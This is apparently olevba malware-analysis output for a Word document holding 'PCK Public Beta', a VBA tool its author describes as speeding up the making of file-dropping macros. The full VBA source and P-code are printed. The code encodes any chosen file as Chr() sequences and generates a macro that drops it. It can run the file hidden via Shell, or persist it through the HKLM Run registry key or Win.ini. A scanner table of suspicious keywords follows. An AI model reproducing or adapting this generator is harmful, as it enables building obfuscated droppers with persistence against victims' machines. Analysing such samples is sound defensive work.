olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.PCK
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.PCK - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Execute_PCK()
PCK.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO PCK.frm 
in file: Constructor.MSWord.PCK - OLE stream: 'Macros/VBA/PCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim PayloadString As String
Dim TmpStr As Integer
Dim OutStr As String
Private Sub Create_Click()
If OptionButton1.Value = True Then RunStr = ""
If OptionButton2.Value = True Then RunStr = "Shell " & Chr(34) & FTD.Text & Chr(34) & ", vbHide"
If OptionButton3.Value = True Then RunStr = "System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" & Chr(34) & ", " & Chr(34) & "PCK Public Beta" & Chr(34) & ") = " & Chr(34) & FTD.Text & Chr(34)
If OptionButton4.Value = True Then RunStr = "System.PrivateProfileString(" & Chr(34) & "C:\Windows\Win.ini" & Chr(34) & ", " & Chr(34) & "windows" & Chr(34) & ", " & Chr(34) & "run" & Chr(34) & ") = " & Chr(34) & FTD.Text & Chr(34)
Open FTC.Text For Binary As #1
PayloadString = Input(LOF(1), #1)
Close #1
For X = 1 To Len(PayloadString)
Y = Y + 1
TmpStr = Asc(Mid(PayloadString, X, 1))
OutStr = OutStr & "Chr(" & TmpStr & ")"
If X < Len(PayloadString) Then OutStr = OutStr & " + "
If Y = 10 Then
If X < Len(PayloadString) Then OutStr = OutStr & "_" & Chr(13) & Chr(10)
Y = 0
End If
Next X
Open SourceOut.Text For Output As #1
Print #1, "Sub Payload()"
Print #1, "Open " & Chr(34) & FTD.Text & Chr(34) & " For Output As #1"
Print #1, "Print #1, " & OutStr
Print #1, "Close #1"
Print #1, RunStr
Print #1, "End Sub"
Close #1
End Sub
'PCK Public Beta is property
'of the public, hence the name.
'Feel free to modify PCK... Be
'sure to send me a copy of your
'changes. And by the way if you
'do change PCK, please acknowledge
'that I was The original creator.
'Thank you for your interest, Lys
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.PCK
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5250 bytes
' Line #0:
' 	FuncDefn (Sub Execute_PCK())
' Line #1:
' 	Ld PCK 
' 	ArgsMemCall Show 0x0000 
' Line #2:
' 	EndSub 
' Macros/VBA/PCK - 22802 bytes
' Line #0:
' 	Dim 
' 	VarDefn PayloadString (As String)
' Line #1:
' 	Dim 
' 	VarDefn TmpStr (As Integer)
' Line #2:
' 	Dim 
' 	VarDefn OutStr (As String)
' Line #3:
' 	FuncDefn (Private Sub Create_Click())
' Line #4:
' 	Ld OptionButton1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St RunStr 
' 	EndIf 
' Line #5:
' 	Ld OptionButton2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld FTD 
' 	MemLd Then 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0008 ", vbHide"
' 	Concat 
' 	St RunStr 
' 	EndIf 
' Line #6:
' 	Ld OptionButton3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "System.PrivateProfileString("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "PCK Public Beta"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld FTD 
' 	MemLd Then 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St RunStr 
' 	EndIf 
' Line #7:
' 	Ld OptionButton4 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "System.PrivateProfileString("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "C:\Windows\Win.ini"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "windows"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 "run"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld FTD 
' 	MemLd Then 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St RunStr 
' 	EndIf 
' Line #8:
' 	Ld FTC 
' 	MemLd Then 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #9:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St PayloadString 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #11:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PayloadString 
' 	FnLen 
' 	For 
' Line #12:
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Add 
' 	St Y 
' Line #13:
' 	Ld PayloadString 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St TmpStr 
' Line #14:
' 	Ld OutStr 
' 	LitStr 0x0004 "Chr("
' 	Concat 
' 	Ld TmpStr 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St OutStr 
' Line #15:
' 	Ld X 
' 	Ld PayloadString 
' 	FnLen 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld OutStr 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	St OutStr 
' 	EndIf 
' Line #16:
' 	Ld Y 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld X 
' 	Ld PayloadString 
' 	FnLen 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld OutStr 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OutStr 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0000 
' 	St Y 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld SourceOut 
' 	MemLd Then 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Sub Payload()"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "Open "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld FTD 
' 	MemLd Then 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 " For Output As #1"
' 	Concat 
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Print #1, "
' 	Ld OutStr 
' 	Concat 
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Close #1"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld RunStr 
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #29:
' 	EndSub 
' Line #30:
' 	QuoteRem 0x0000 0x001B "PCK Public Beta is property"
' Line #31:
' 	QuoteRem 0x0000 0x001E "of the public, hence the name."
' Line #32:
' 	QuoteRem 0x0000 0x001D "Feel free to modify PCK... Be"
' Line #33:
' 	QuoteRem 0x0000 0x001E "sure to send me a copy of your"
' Line #34:
' 	QuoteRem 0x0000 0x001E "changes. And by the way if you"
' Line #35:
' 	QuoteRem 0x0000 0x0021 "do change PCK, please acknowledge"
' Line #36:
' 	QuoteRem 0x0000 0x0020 "that I was The original creator."
' Line #37:
' 	QuoteRem 0x0000 0x0020 "Thank you for your interest, Lys"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PCK Public Beta�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aboutubl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Setupubl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Createbl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ich Bin Ein...a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Umm...n 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Play With It...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Output And Destruct!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cab6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i106/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This was written to speed up the process of making file dropping macros. I've written this for myself and decided to make it public. If you want to see an update, I expect some feedback. One can email me at either:  lyskovick@altern.org lys_kovick@hotmail.com
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i106/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\command.como
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\command.como
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Do Not Execute Payload@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Execute Payload Upon Dropping
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Edit Registry To Execute Payload Upon Reboot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Edit Win.ini To Execute Payload Upon Reboot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\payload.txto
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Large files may lock up PCK... If that's the case, hit Ctrl + Break and choose a smaller file! If you know of a way that I can better PCK please send me an email!@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Terminal
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'PCK'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'About'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Setup'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Create'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i106'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'FTC'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\command.com'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'FTD'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\command.com'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i107'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image3'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'SourceOut'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\payload.txt'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Create'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.PCK' - OLE stream: 'Macros/PCK/i103/i108'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Create_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|DESTao              |44455354616F                                 |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

